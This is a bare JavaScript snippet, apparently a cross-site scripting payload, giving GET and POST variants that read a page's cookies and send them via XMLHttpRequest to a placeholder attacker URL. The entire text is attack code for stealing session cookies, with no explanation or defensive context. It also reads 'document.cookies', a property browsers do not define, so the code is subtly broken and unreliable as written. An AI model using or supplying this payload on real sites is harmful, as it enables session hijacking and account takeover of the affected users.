// GET
var cookies = document.cookies;
var xhr = new XMLHttpRequest();
xhr.open("GET", "<URL>/?cookies=" + encodeURIComponent(cookies), true);
xhr.send();


// POST
var cookies = encodeURIComponent(document.cookies);
var xhr = new XMLHttpRequest();
xhr.open("POST", "<URL>/?cookie=" + cookies, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("cookies=" + cookies);